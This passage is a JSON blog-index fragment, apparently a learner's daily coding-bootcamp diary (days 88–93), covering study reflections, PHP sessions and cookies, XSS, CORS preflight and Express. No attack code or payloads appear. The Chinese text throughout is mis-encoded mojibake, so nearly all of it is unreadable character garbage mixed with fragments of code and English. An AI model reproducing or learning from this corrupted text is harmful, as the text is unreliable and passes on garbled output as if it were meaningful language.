ä¹Ÿæœ‰æ™‚å€™æ˜¯æ±è¥¿å¯ä»¥é‹ä½œï¼ŒåŠŸèƒ½ä¸Šæ²’å•é¡Œå°±æ²’å†å»ç´°ç©¶äº†ã€‚ä¸çŸ¥é“é€™æ˜¯ä¸æ˜¯äººçš„ä¸€ç¨®æƒ°æ€§ï¼Œæ±è¥¿æ­£å¸¸é‹ä½œä¸å°±ä»£è¡¨æˆ‘åšå°äº†å—ï¼Ÿç‚ºä»€éº¼é‚„è¦èŠ±æ™‚é–“è·Ÿå¿ƒåŠ›å»ç ”ç©¶é‚£äº›ã€Œæˆ‘èªç‚ºå·²ç¶“ç¶“ææ‡‚çš„æ±è¥¿ï¼Ÿã€ ä½†åœ¨çœ‹å®Œå¾Œé€™æ®µè©±ä»¥å¾Œæˆ‘è¢«æ‰“é†’äº†ï¼š ä½ æ ¹æœ¬æ²’æœ‰å®Œå…¨ææ‡‚ï¼Œè€Œä¸”é‚„å¿½ç•¥äº†å­¸ç¿’éç¨‹ä¸­æœ€ç²¾è¯çš„ä¸€éƒ¨åˆ†ã€‚ æ‰€ä»¥æ‰å›éé ­å»æŠŠä¼¼æ‡‚éæ‡‚çš„æ±è¥¿é‡æ–°ç ”ç©¶äº†ä¸€éï¼Œç¢ºä¿è‡ªå·±çœŸçš„ç†è§£ï¼Œæˆ‘çš„æ¯ä¸€æ­¥åˆ°åº•åœ¨åšä»€éº¼ã€‚ ä¹‹å¾Œå‘¢ï¼Œè¤‡ç¿’å®Œå¾Œå°±ç¹¼çºŒå¯«ç°¡ç­”é¡Œçš„ä½œæ¥­ï¼Œæœ€å¾Œç¸½ç®—æ˜¯æŠŠ week14 å®Œæˆäº†å§ï¼ å­¸åˆ°çš„äº‹æƒ…ä¾†è«‡è«‡é—œæ–¼å¯«ç°¡ç­”é¡Œçš„å¿ƒå¾—å§ã€‚ åœ¨å¯«äº† 14 é€±çš„ç°¡ç­”é¡Œå¾Œï¼Œæˆ‘é«”æœƒåˆ°è¦æ€éº¼æª¢æ¸¬è‡ªå·±å°ä¸€é …çŸ¥è­˜çš„ç†è§£ç¨‹åº¦åˆ°å“ªè£¡ï¼Ÿ æœ‰äº›æ™‚å¾Œä½ é›–ç„¶å¯ä»¥ç”¨å¾ˆç°¡å–®çš„ä¸€å…©å¥è©±ä¾†æè¿°æŸå€‹æ¦‚å¿µï¼Œä½†é€™ä»£è¡¨ä½ çœŸçš„ç†è§£å—ï¼Ÿä¹Ÿè¨±ä½ çŸ¥é“å®ƒçš„å®šç¾©ï¼Œç„¶å¾Œå‘¢ï¼Ÿä½ çŸ¥é“ç‚ºä»€éº¼è¦æœ‰é€™å€‹æ¦‚å¿µå—ï¼Ÿé‚„æœ‰é€™å€‹æ¦‚å¿µæ˜¯å› ç‚ºä»€éº¼è€Œç”¢ç”Ÿçš„ï¼Ÿ åœ¨æˆ‘å¯«è¶Šå¤šæ¬¡ä½œæ¥­å¾Œï¼Œå°±è¶Šæ˜¯æœƒæ€è€ƒé€™äº›å•é¡Œã€‚ æ‰€ä»¥ï¼Œæ¯ç•¶æˆ‘ç¢°åˆ°ã€Œé›–ç„¶ç­”çš„å‡ºä¾†ï¼Œä½†å»è¦ºå¾—ä¸å®Œæ•´æ™‚ã€ï¼Œæˆ‘æœƒæ„Ÿåˆ°å¿ƒè™›ã€‚é€™æ¨£çš„å¿ƒè™›æœƒä¿ƒä½¿æˆ‘å†å›éé ­å»æŸ¥è³‡æ–™ï¼Œè©¦è‘—é‡æ–°ç†è§£æŸæ¨£æ¦‚å¿µï¼Œé‚„æœ‰å®ƒèƒŒå¾Œçš„æ¶µç¾©ï¼Œç·£ç”±ç­‰ç­‰ä¹‹é¡çš„ã€‚ å…¶å¯¦æˆ‘ä¸çŸ¥é“é€™æ¨£æ˜¯å¥½é‚„æ˜¯ä¸å¥½ï¼Œé€™æ¨£çš„åšæ³•ç¢ºå¯¦èƒ½è®“ä½ æŠŠæŸæ¨£æ±è¥¿å­¸çš„å¾ˆã€Œç´®å¯¦ã€ï¼Œä½†åŒæ™‚ä¹Ÿå¤±å»äº†å­¸ç¿’å…¶ä»–ã€Œé€²åº¦ã€çš„æ™‚é–“ã€‚ ç¸½ä¹‹é€™æ˜¯é“é›£é¡Œå§ï¼Œå„˜ç®¡æˆ‘ç›®å‰æ²’æœ‰é€²åº¦å•é¡Œï¼Œä½†æˆ‘ä¹Ÿé‚„æ˜¯æœƒæ“”å¿ƒè‡ªå·±åšäº†ä¸å°çš„é¸æ“‡ã€‚ é¡Œå¤–è©±ä»Šå¤©çœ‹äº†å¾ˆå¤š Huli æåˆ°çš„ç¾å¯¦å±¤é¢å•é¡Œï¼Œç‰¹åˆ¥æ˜¯å’Œä½œå“ç›¸é—œçš„ã€‚ ä¹Ÿè¨±é€™äº›æˆ‘æ—©å°±çŸ¥é“ï¼Œè‡ªå·±åšçš„é€™äº›ä½œå“ï¼Œåœ¨é¢è©¦å®˜çœ¼è£¡æ˜¯å€‹ä¸å€¼å¾—ä¸€æçš„æ±è¥¿ï¼Œç”šè‡³æœ‰å¯èƒ½æœƒè¦ºå¾—æŠŠé€™éº¼åŸºç¤çš„æ‹¿æ±è¥¿å‡ºä¾†åšä»€éº¼ï¼Ÿ ä¸éæ²’é—œä¿‚ï¼Œè‡³å°‘ç¾åœ¨æˆ‘ç†è§£åˆ°é€™äº›äº‹æƒ…ï¼Œä¹ŸçŸ¥é“æˆ‘ä¸‹ä¸€æ­¥è©²æ€éº¼è¦åŠƒï¼Œé€™é»æ‰æ˜¯æœ€é‡è¦çš„å§ã€‚ å³ä¾¿æˆ‘åªæœ‰è‡ªå·±ä¸€å€‹äººï¼Œä½†ç›¸ä¿¡æˆ‘é‚„æ˜¯èƒ½åšåˆ°å¾ˆå¤šäº‹æƒ…çš„ã€‚ è¨±é¡˜æ± æ˜å¤©é–‹å§‹é€²å…¥åˆ°è¤‡ç¿’é€±çš„éƒ¨åˆ†ã€‚ ä¸€ç›´ä»¥ä¾†æˆ‘éƒ½æ˜¯ä»¥é€²åº¦ç‚ºä¸»ï¼Œä½†ä¹Ÿè¨±é€™æ¬¡æˆ‘è©²ä¾†å¥½å¥½è¤‡ç¿’ä¸€ä¸‹äº†ï¼Œç•¢ç«Ÿé€™å¹¾é€±æœ‰äº›çš„æ±è¥¿æ˜¯æˆ‘æ²’æ¥è§¸éï¼Œä¹Ÿç›¸ä¿¡é€™äº›è¤‡ç¿’å¸¶ä¾†çš„æ•ˆç›Šä¹Ÿè¨±æœƒæ¯”æˆ‘é æœŸä¸­é‚„è¦ä¾†å¾—å¤šã€‚ æœ€å¾Œä¾†å€‹é ­å°¾å‘¼æ‡‰ï¼Œä¸èƒ½æ‰ä»¥è¼•å¿ƒã€‚","link":"/2022/03/12/mentor-program-day88/"},{"title":"mentor-program-day89","text":"ç¶­æŒè‡ªå·±çš„æ­¥èª¿ï¼Œä¸è¦æ“ä¹‹éæ€¥ã€‚ é€²åº¦ä»Šå¤©ä¸€æ¨£çœ‹ [MTR01] è¤‡ç¿’å‰å¹¾é€±çš„å…§å®¹ï¼Œåšäº†ä¸€å€‹ç°¡çŸ­ç­†è¨˜ï¼šè³‡æ–™åº«æ­£è¦åŒ– æ¥è‘—è¤‡ç¿’å®Œè³‡æ–™åº«çš„éƒ¨åˆ†å¾Œï¼Œæˆ‘åˆå›å»ç ”ç©¶äº† session å’Œ cookie é€™å°å€†å£çš„æ„›æ¨æƒ…ä»‡ã€‚æ„Ÿè¦ºå°é€™å…©å€‹æ¦‚å¿µæœ‰åœ¨æ›´æ¸…æ¥šä¸€äº›ï¼Œä½†é‚„æ˜¯æœ‰äº›æ¨¡ç³Šã€‚ åƒæ˜¯å¦‚æœæ‹¿ Huli å¯«çš„é€™ç¯‡ï¼šç™½è©± Session èˆ‡ Cookieï¼šå¾ç¶“ç‡Ÿé›œè²¨åº—é–‹å§‹ï¼Œæˆ‘æœƒé€™æ¨£å€åˆ† cookie å’Œ sessionï¼š session æ˜¯ä¸€ç¨®è®“ç€è¦½å™¨èƒ½å¤ ã€Œè¨˜ä½ç‹€æ…‹ã€çš„æ©Ÿåˆ¶ï¼Œå¯¦ä½œçš„æ–¹å¼æœ‰å¾ˆå¤šç¨®ï¼Œå¯ä»¥æ˜¯ç¶²å€ï¼Œä¹Ÿå¯ä»¥æ˜¯ cookieã€‚ cookie åªæ˜¯ä¸€å€‹æ‹¿ä¾†å„²å­˜æ±è¥¿çš„æ–‡å­—æª”ï¼Œä¹‹æ‰€ä»¥å’Œ session é‚£éº¼æ›–æ˜§æ˜¯å› ç‚ºå¤§éƒ¨åˆ†æœƒæ‹¿å®ƒä¾†å¯¦ä½œ session æ©Ÿåˆ¶ã€‚ æ‰€ä»¥é€™é‚Šèƒ½åšå€‹ç¸½çµï¼šsession æ˜¯ä¸€ç¨®è®“ç€è¦½å™¨è¨˜ä½ç‹€æ…‹çš„ã€Œæ©Ÿåˆ¶ã€ï¼Œè€Œ cookie åªæ˜¯å¯¦ç¾ session çš„ä¸€ç¨®æ–¹å¼ã€‚ ä½†æ˜¯ï¼Œå¦‚æœä½ åˆ°ç¶²è·¯ä¸Šæœå°‹å…¶ä»– session å’Œ cookie çš„è§£é‡‹ï¼Œä¾‹å¦‚é€™ç¯‡ï¼šDay14-Sessionèˆ‡Cookieå·®åˆ¥ï¼Œåˆæœƒå¾—åˆ°ä¸åŒçš„è§€é»ï¼Œæˆ‘ç›´æ¥ç¯€éŒ„ä¸€æ®µï¼š Session è² è²¬ç´€éŒ„åœ¨ serverç«¯ä¸Šçš„ä½¿ç”¨è€…è¨Šæ¯ï¼Œæœƒåœ¨ä¸€å€‹ç”¨æˆ¶å®Œæˆèº«åˆ†èªè­‰å¾Œï¼Œå­˜ä¸‹æ‰€éœ€çš„ç”¨æˆ¶è³‡æ–™ï¼Œæ¥è‘—ç”¢ç”Ÿä¸€çµ„å°æ‡‰çš„ IDï¼Œå­˜å…¥ cookie å¾Œå‚³å›ç”¨æˆ¶ç«¯ã€‚ Sessionæ³›æŒ‡æœ‰å§‹æœ‰çµ‚çš„ç³»åˆ—å‹•ä½œ/æ¶ˆæ¯ï¼Œå¥½æ¯”æœƒè©±ä¸€èˆ¬ã€‚ ç°¡å–®ä¾†èªªï¼Œå¤§éƒ¨åˆ†äººå° session çš„å®šç¾©æ˜¯ï¼š è³‡æ–™è¦å„²å­˜åœ¨ server ç«¯ client ç«¯åªæœƒå„²å­˜ session_id ç¸½ä¹‹ï¼Œæˆ‘å€‹äººé‚„æ˜¯å‚¾å‘ Huli çš„è§€é»ã€‚é›–ç„¶ä½ å»å¤–é¢å•åˆ¥äºº session æ˜¯ä»€éº¼ï¼Ÿä¸€å­—æ’é–‹éƒ½æœƒå‘Šè¨´ä½ ç¬¬äºŒç¨®çš„è§€é»ï¼Œä½†ç¸½è¦ºå¾—é‚„æ˜¯å“ªè£¡æ€ªæ€ªï¼Ÿ å“ªè£¡æ€ªï¼Ÿæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œå°±æ˜¯æ€ªæ€ªçš„ã€‚ å­¸åˆ°çš„äº‹æƒ…ç ”ç©¶ session å…¶å¯¦æ˜¯æƒ³è¤‡ç¿’ PHP è£¡é¢çš„ session_start() èƒŒå¾Œåœ¨åšä»€éº¼ï¼Œæ‰€ä»¥å°±ä¾†è¤‡ç¿’ä¸€ä¸‹å§ï¼š ç¬¬ä¸€æ­¥ï¼šæ‰“é–‹ session1session_start() åŸ·è¡Œé€™ä¸€è¡Œçš„æ™‚å€™ï¼Œå¯ä»¥æƒ³æˆæ˜¯å¹«ä½ åŸ·è¡Œï¼š 1setcookie('PHPSESSID', 'p0s3rb0qd9ih82tbgv120n882p', 'Session'); æ¥è‘—å°±æœƒå¹«ä½ åˆ° tmp è£¡å»ºç«‹ä¸€å€‹æª”æ¡ˆï¼Œç”¨ä¾†å„²å­˜è³‡æ–™ï¼š 123456789â”€â”€â”€tmp â”œâ”€â”€â”€ibE87C â”œâ”€â”€â”€ibE87D â”œâ”€â”€â”€ibE87E â”œâ”€â”€â”€ibE88F â”œâ”€â”€â”€sess_8oadq07ei2b8g25muckbpfjs8n â”œâ”€â”€â”€sess_p0s3rb0qd9ih82tbgv120n882p =&gt; å‡è¨­æ˜¯å®ƒå§ â”œâ”€â”€â”€sess_gukpo79ueg96nfld2mj5jo2sql â”œâ”€â”€â”€why ç¬¬äºŒæ­¥ï¼šè¨­å®š session è³‡æ–™æ¥ä¸‹ä¾†æ˜¯å„²å­˜è³‡æ–™ï¼š 1$_SESSION['username'] = 'peanu'; é€™ä¸€æ­¥æœƒè‡ªå‹•å¹«ä½ å¹«è³‡æ–™å­˜åˆ° sess_p0s3rb0qd9ih82tbgv120n882p è£¡é¢ï¼š 12# cat sess_p0s3rb0qd9ih82tbgv120n882pusername|s:5:\"peanu\"; ç¬¬ä¸‰æ­¥ï¼šçµæŸ sessionæœ€å¾Œæ˜¯æ¸…é™¤è³‡æ–™ï¼š 1session_destroy(); é€™ä¸€æ­¥å¯ä»¥æƒ³æˆæ˜¯ã€Œé€™å€‹ session çµæŸäº†ï¼Œå¹«æˆ‘æ¸…é™¤æ‰€æœ‰ç´€éŒ„ã€ï¼Œæ‰€ä»¥ sess_p0s3rb0qd9ih82tbgv120n882p æœƒè¢«åˆªé™¤ï¼Œè€Œ $_SESSION ä¹Ÿæœƒè®Šæˆä¸€å€‹ç©ºé™£åˆ—ã€‚ ä¸»è¦çš„æµç¨‹å·®ä¸å¤šå°±æ˜¯é€™æ¨£å§ã€‚ å¾Œä¾†æˆ‘ç ”ç©¶å¾ˆä¹…çš„åœ°æ–¹æ˜¯ã€Œæ€éº¼æŠŠ application è£¡çš„ PHPSESSID çµ¦åˆªé™¤ï¼Ÿã€ã€‚åŸ·è¡Œ session_destroy() é›–ç„¶èƒ½æ¸…æ‰ server ç«¯çš„è³‡æ–™ï¼Œä½†æ˜¯ client ç«¯çš„ cookie é‚„æ˜¯æœƒä¿ç•™ PHPSESSIDã€‚ æˆ‘çˆ¬äº†å¾ˆå¤šæ–‡ç« ï¼Œä¹Ÿè©¦éäº†å¾ˆå¤šç¨®æ–¹å¼ï¼Œåƒæ˜¯ç›´æ¥ set-cookie è®“ cookie éæœŸï¼Œé‚„æ˜¯æ”¹å¯«å€¼ä¹‹é¡çš„æˆ‘éƒ½æ˜¯éäº†ï¼Œä½†å°±æ˜¯æ²’æœ‰ä½œç”¨ã€‚ é›–ç„¶æœ‰é»æ²®å–ªï¼Œä½†æ²’é—œä¿‚ï¼Œå°±ä¹‹å¾Œå†æ…¢æ…¢ç ”ç©¶å§ã€‚ é¡Œå¤–è©±è¤‡ç¿’æ˜¯ä»¶éœ€è¦è€å¿ƒçš„äº‹ï¼Œä½†é‚„æ˜¯ç¹¼çºŒåŠ æ²¹ï¼ è¨±é¡˜æ± æ˜å¤©ç¹¼çºŒè¤‡ç¿’ï¼Œå¸Œæœ›èƒ½æŠŠä»¥å‰ä¸æ‡‚çš„éƒ¨åˆ†çµ¦è£œé½Šã€‚","link":"/2022/03/13/mentor-program-day89/"},{"title":"mentor-program-day90","text":"é€™æ¼«é•·çš„é¦¬æ‹‰æ¾ï¼Œå·²ç¶“è·‘äº†ä¸€åŠäº†ã€‚ é€²åº¦ä»Šå¤©ç¸½ç®—æ˜¯æŠŠ [MTR01] æƒ³è¤‡ç¿’çš„éƒ¨åˆ†çœ‹å®Œäº†ï¼Œæ¥è‘—åªè¦æŠŠä½œæ¥­åšå®Œå°±èƒ½é€²å…¥ä¸‹é€±é€²åº¦äº†å§ï¼ŒåŠ æ²¹ï¼ åœ¨è¤‡ç¿’åˆ° session çš„éƒ¨åˆ†æ™‚ï¼Œä¸æ­»å¿ƒçš„æˆ‘åˆå†æ¬¡æœå°‹æ˜¨å¤©æ²’è§£é–‹çš„è¬ï¼Œçµæœçµ‚æ–¼è§£é–‹äº†ï¼šå¦‚ä½• PHP æ­£ç¢ºçš„æ¸…é™¤ sessionã€‚ä¹Ÿæ‰¾å‡ºä¸€é–‹å§‹åˆªä¸æ‰çš„åŸå› æ˜¯ä»€éº¼ï¼ŒåŸä¾†æ˜¯ path çš„è·¯å¾‘å¿…é ˆä¸€è‡´æ‰è¡Œï¼Œæ‰€ä»¥æœ‰å¯èƒ½æˆ‘ç•¶åˆåœ¨è©¦çš„æ™‚å€™éƒ½å‰›å¥½ä¸ä¸€è‡´å§ï¼ŒçœŸæ˜¯çš„ï¼ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©ä¹Ÿæ˜¯ä»¥è¤‡ç¿’ç‚ºä¸»ï¼Œæ‰€ä»¥å¥½åƒæ²’ä»€éº¼èƒ½å¯«ï½ä½†ç¸½ä¹‹ç¾åœ¨å° session å’Œ cookie æœ‰æ¯”è¼ƒç†è§£äº†ã€‚ é¡Œå¤–è©±çœ‹æœ€è¿‘ä¸å°‘äººåœ¨è¨è«–é—œæ–¼ä½œå“é›†çš„äº‹æƒ…ï¼Œæ„æ€æ˜¯èªªå¤§å®¶åšçš„æ±è¥¿éƒ½å¤ªåƒå•¦ã€‚ é€™ç¢ºå¯¦æ˜¯è¿‘æœŸçš„ç¾è±¡ï¼Œæ‰€ä»¥æœ€è¿‘ä¹Ÿä¸€ç›´åœ¨æ€è€ƒè©²æ€éº¼åšå‡ºä¸€å€‹æ¯”è¼ƒç‰¹åˆ¥çš„æ±è¥¿æ‰å¥½ã€‚ å¸Œæœ›æˆ‘èƒ½æƒ³å‡ºä¾†ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½æŠŠè¤‡ç¿’çš„éƒ¨åˆ†å®Œæˆï¼ŒåŠ æ²¹ã€‚","link":"/2022/03/14/mentor-program-day90/"},{"title":"mentor-program-day91","text":"å¸Œæœ›èƒ½æœ‰ä¸€å€‹ä¸éŒ¯çš„ ideaã€‚ é€²åº¦ä»Šå¤©æŠŠä¹‹å‰è€½æ“±åšçš„ç­†è¨˜çµ¦åšå®Œï¼š å¾ chmod èªè­˜ Linux ä¸­çš„æ¬Šé™ç®¡ç† è³‡æ–™çµæ§‹ï¼Stack èˆ‡ Queue å¾Œä¾†å»åšäº†é€™ä»½æ¸¬é©—ï¼šç¶²ç«™å‰å¾Œç«¯é–‹ç™¼åŸºç¤æ¸¬è©¦ã€‚æ•´é«”ä¾†èªªè »é †åˆ©çš„ï¼Œä¹Ÿå­¸åˆ°äº†ä¸€äº›ä»¥å‰æ²’æ³¨æ„åˆ°çš„ç´°ç¯€ï¼Œæ˜¯ä¸€ä»½å¾ˆæœ‰è¶£çš„æ¸¬é©—ã€‚ å¦å¤–ï¼Œçœ‹åˆ¥äººçš„ç­”æ¡ˆæ™‚èƒ½è§€å¯Ÿåˆ°æ¯å€‹äººçš„æ€è·¯å¤§æ¦‚å¦‚ä½•ï¼Œé€™è »æœ‰æ„æ€çš„ï¼Œå› ç‚ºæ¯å€‹äººçš„æƒ³æ³•éƒ½å·®è »å¤šçš„ã€‚é‚„æœ‰ç­”éŒ¯çš„éƒ¨åˆ†å…¶å¯¦ä¹Ÿå¾ˆæœ‰åƒ¹å€¼ï¼Œå› ç‚ºå¯ä»¥å¾ˆæ¸…æ¥šçœ‹åˆ°èª¤è§£çš„åœ°æ–¹åœ¨å“ªï¼Œæœ‰äº›å°±è·Ÿæˆ‘ä»¥å‰çš„æƒ³æ³•ä¸€æ¨£ï¼Œæ‰€ä»¥é‚„è »æ„ŸåŒèº«å—çš„ã€‚ è¤‡ç¿’çš„éƒ¨åˆ†å·®ä¸å¤šå°±åˆ°é€™äº†å§ï¼Œæ¥è‘—æŠŠå¿ƒå¾—å¯«å®Œå¾Œå°±èƒ½é€²å…¥ä¸‹é€±äº†ã€‚ å­¸åˆ°çš„äº‹æƒ…å­¸åˆ°äº† XSS ä¸åªå¯ä»¥ç”¨ &lt;script&gt;ï¼Œè€Œæ˜¯æœ‰å„ç¨®å¥‡å½¢æ€ªç‹€çš„çªè®Šé«”å¯ä»¥æå®ä½ çš„ç¶²ç«™ã€‚é€™é‚Šå†æ¬¡å‘è³‡å®‰äººå“¡è‡´æ•¬ï¼Œé€™çœŸçš„ä¸å®¹æ˜“ &lt;(_ _)&gt; é‚„æœ‰å­¸æœƒæ€éº¼åˆ†æ Error ä¹Ÿæ˜¯é–€å­¸å•ï¼Œå¾ˆå¤šæ™‚å¾Œã€Œè‡ªå·±æƒ³çš„ã€ä¸ä»£è¡¨ã€Œé›»è…¦æƒ³çš„ã€ã€‚æ‰€ä»¥æ­£ç¢ºçš„åšæ³•æ˜¯ç´°å¿ƒåœ°å»æ¸¬è©¦å’Œç¢ºèªçµæœï¼Œè€Œä¸æ˜¯è‡ªå·±çæ°ï¼Œå¦‚æœå› ç‚ºæ‡¶å°±ç”¨çŒœçš„ï¼Œå¾ˆå¤šæ™‚å€™æœƒè¢«æ‰“è‡‰ã€‚ å¦å¤–ä¹Ÿé‡æ–°è¤‡ç¿’äº† CROS çš„å•é¡Œï¼Œä¹Ÿé«”æœƒåˆ°å¦‚æœä½ å°ä¸€å€‹è§€å¿µä¸å®Œæ•´ï¼Œåœ¨åšé¡Œç›®æ™‚å¾ˆå¿«å°±æœƒæ¼é¤¡ã€‚åƒåœ¨åš Q3 çš„æ™‚å€™æˆ‘å°±ç–å¿½äº† preflight request æ©Ÿåˆ¶ï¼Œæ‰€ä»¥ç­”çš„ä¸å¤ ç²¾ç¢ºã€‚ æ‰€ä»¥å‘€ï¼Œæœ‰äº›æ±è¥¿æ˜¯é¿ä¸é–‹çš„ï¼Œæœ€çµ‚éƒ½é‚„æ˜¯å¾—å­¸æœƒçš„ã€‚é¿çš„äº†ä¸€æ™‚ï¼Œé¿ä¸äº†ä¸€ä¸–ã€‚ é¡Œå¤–è©±æœ‰æ™‚æœƒè¦ºå¾—æ¯”èµ·å¯« codeï¼Œå‰µä½œæ‰æ˜¯æ›´å›°é›£çš„äº‹æƒ…ã€‚ å¸Œæœ›æˆ‘èƒ½å‰µä½œå‡ºä¸€ä»½æœ‰è¶£çš„ä½œå“ã€‚ æœŸè¨±æ˜å¤©å¸Œæœ›èƒ½é€²å…¥ä¸‹é€±ï¼ŒåŠªåŠ›è¿½é€²åº¦ï¼","link":"/2022/03/15/mentor-program-day91/"},{"title":"mentor-program-day92","text":"ç™¼ç¾äº†æ–°çš„æ±è¥¿ã€‚ é€²åº¦é€™å¹¾å¤©ç™¼ç”Ÿäº†ä¸€äº›äº‹æƒ…ï¼Œæ‰€ä»¥å°‘äº†ä¸€äº›æ™‚é–“ä¾†è¶•é€²åº¦ã€‚ä½†æˆ‘é‚„æ˜¯æœƒç›¡é‡ç¶­æŒä¸‹å»çš„ï¼Œè¦å¥½å¥½åŠ æ²¹ã€‚ ä»Šå¤©åšäº†ä¸€äº›æ–°çš„ç­†è¨˜ï¼š ä½ æƒ³ä¸åˆ°çš„ XSS æ”»æ“Šæ–¹å¼ è¢«éºå¿˜çš„ Preflight request åšå®Œæ¸¬é©—å¾Œæ‰ç™¼ç¾æœ‰å¾ˆå¤šç´°ç¯€è¢«æˆ‘å¿½ç•¥äº†ï¼Œå¥½åœ¨æœ‰ç™¼ç¾ã€‚ ä¹Ÿè¨±æœªä¾†ä¹Ÿæœƒä¸åœç¢°åˆ°åƒé€™æ¨£çš„äº‹æƒ…å§ï¼Œç¸½ä¹‹è¦å¥½å¥½å¾€å‰èµ°ä¸‹å»ã€‚ ä¹‹å¾Œä¹Ÿå»å¯«äº†è¤‡ç¿’é€±çš„å¿ƒå¾—ï¼Œå¯«å¿ƒå¾—é›–ç„¶è½èµ·ä¾†å®¹æ˜“ï¼Œå¯å¯¦éš›ä¸Šé‚„è »èŠ±æ™‚é–“çš„ï¼Œä½ å¿…é ˆå»æ€è€ƒåœ¨é€™å¹¾é€±ä½ å­¸åˆ°äº†ä»€éº¼ï¼Ÿä»€éº¼æ±è¥¿è®“ä½ å°è±¡ç‰¹åˆ¥æ·±åˆ»ï¼Ÿç­‰ç­‰ã€‚ä½†æˆ‘èªç‚ºåœ¨å¯«çš„åŒæ™‚å¯ä»¥åŠ æ·±ä½ å°æŸæ¨£çŸ¥è­˜çš„ç†è§£ï¼Œæ‰€ä»¥è¦ºå¾—é€™æ˜¯å€¼å¾—å»åšçš„äº‹æƒ…ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©ä¸»è¦å°±å¯«ç­†è¨˜å’Œå¯«å¿ƒå¾—ï¼Œæ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯æˆ‘å¾åˆ¥äººçš„å¿ƒå¾—è£¡ç™¼ç¾äº†é€™å€‹ï¼šLidemy ç¬¬äº”æœŸæœŸä¸­æ¸¬é©—ã€‚ åŸä¾†æœ‰é€™æ¨£çš„æ±è¥¿å‘€ï¼Œé‚£æˆ‘ç•¶ç„¶è¦ä¾†åšåšçœ‹å›‰ï¼æ„Ÿè¦ºé€™ä»½èª²ç¶±èƒŒå¾ŒçœŸçš„è€ƒæ…®äº†ä¸å°‘äº‹æƒ…ï¼Œé‚„æ˜¯ä½©æœèƒ½è¨­è¨ˆå‡ºé€™äº›èª²ç¶±çš„äººã€‚ é¡Œå¤–è©±ä»Šå¤©æˆ‘é«”æœƒåˆ°ä»€éº¼å«åšå­¸ä»¥è‡´ç”¨ã€‚å°±æ˜¯ç•¶ä½ çœ‹åˆ°å‰ç«¯åšçš„ä¸€è¹‹ç³Šå¡—æ™‚ï¼Œå€’ä¸å¦‚ç›´æ¥å»æŠŠã€Œç”Ÿè³‡æ–™ã€æŒ–å‡ºä¾†çœ‹ï¼š ç°¡å–®ä¾†èªªï¼Œæˆ‘æƒ³æœå°‹è¦çš®åº—åˆ°åº—åœ¨é«˜é›„çš„æ“šé»ï¼Œå¯æ˜æ˜æœå°‹çš„æ˜¯ã€Œé«˜é›„ã€ï¼Œå»è·³å‡ºä¸€å †ä¸ç›¸å¹²çš„çµæœã€‚ æ‰€ä»¥å‘¢ï¼Œé€™æ™‚å€™å­¸å‰ç«¯çš„å¥½è™•å°±ä¾†äº†ï¼Œä½ çŸ¥é“è³‡æ–™åŸºæœ¬ä¸Šéƒ½æ˜¯ç”¨ Ajax å»è·Ÿå¾Œç«¯æ‹¿çš„ï¼Œæ‰€ä»¥åªè¦æŠŠæœ‰å¯èƒ½çš„ API æŠ“å‡ºä¾†å°±èƒ½æ‹¿åˆ°ã€ŒåŸå§‹è³‡æ–™ã€äº†ã€‚ æ¥ä¸‹ä¾†å°±å¥½è¾¦å•¦ï¼Œåˆ©ç”¨ã€ŒCtrl + Fã€ä¾†æœå°‹ã€Œé«˜é›„ã€å°±èƒ½é¦¬ä¸ŠçŸ¥é“æœ‰å¹¾å€‹æœå°‹çµæœäº†ã€‚ ä¸éä¸Šé¢ä¾‹å­æ˜¯ 0ï¼Œæ‰€ä»¥çµæœå°±æ˜¯ï¼š è¦çš®åº—åˆ°åº—åœ¨é«˜é›„é‚„æ²’æœ‰æ“šé» çµæŸã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠæ¸¬è©¦åšå®Œï¼Œç„¶å¾Œâ€¦æ‡‰è©²å°±çœŸçš„èƒ½é€²å…¥ä¸‹é€±äº†å§ã€‚","link":"/2022/03/16/mentor-program-day92/"},{"title":"mentor-program-day93","text":"åŠªåŠ›è£œé€²åº¦ã€‚ é€²åº¦æœ¬ä¾†é æœŸä»Šå¤©èƒ½å…¥ä¸‹é€±é€²åº¦ï¼Œä½†å› ç‚ºä¸€äº›åŸå› è¢« delay äº†ï¼Œåªå¥½å†å¤šç­‰ä¸€å¤©äº†ã€‚ ä»Šå¤©åšäº† Lidemy ç¬¬äº”æœŸæœŸä¸­æ¸¬é©—ï¼Œç›®å‰åšäº†ä¸‰é¡Œï¼Œæ˜å¤©æœƒæ¥è‘—æŠŠæœ€å¾Œä¸€é¡Œçµ¦åšå®Œã€‚ å› ç‚ºä»Šå¤©æ™šä¸Šæ²’è¾¦æ³•ç”¨é›»è…¦ï¼Œæ‰€ä»¥åªå¥½æ”¹çœ‹ [BE201] ç•¶ä½œé ç¿’ï¼Œç¸½ä¹‹ä»Šå¤©å¤§æ¦‚å°±æ˜¯é€™æ¨£å­ã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨å¯«æ¸¬é©—æ™‚ï¼Œå¯ä»¥æ„Ÿè¦ºè‡ªå·±å°æŸæ¨£çŸ¥è­˜çš„ç†è§£ç¨‹åº¦åˆ°å“ªï¼Œé›–ç„¶èªªä¹Ÿæ²’æœ‰å¯«çš„è¶…ç´šé †ï¼Œä½†è·Ÿæœ€é–‹å§‹æ¯”èµ·ä¾†æ„Ÿè¦ºé€²æ­¥å¾ˆå¤šï¼ŒåŸæœ¬çš„è©±æ‡‰è©²åˆ‡æ¿å°±å…ˆå¡é—œäº†å§ã€‚ åˆæ¢ Express çš„æ„Ÿè¦ºé‚„ä¸éŒ¯ï¼Œä¹Ÿçœ‹åˆ° MVC æ¶æ§‹çš„é‡è¦ä¹‹è™•ã€‚æœ‰æ™‚å¸¸å¸¸ç¾¤çµ„è£¡è½åˆ° PHP çš„ç¾©å¤§åˆ©éºµå°ˆæ¡ˆæŠ˜ç£¨äº†ä¸å°‘äººï¼Œå¸Œæœ›è‡ªå·±ä¸æœƒæˆç‚ºä¸‹ä¸€å€‹å—å®³è€…ï¼Œæ„Ÿè¦ºå¾ˆå¯æ€• QQ é¡Œå¤–è©±Express + Node.js ä¼¼ä¹æ‰ç¨±å¾—ä¸Šæ˜¯ç¾ä»£å¾Œç«¯é–‹ç™¼ï¼Œä¸é PHP é‚„æ˜¯æœ‰ä¸€å®šçš„å½±éŸ¿åŠ›ã€‚ 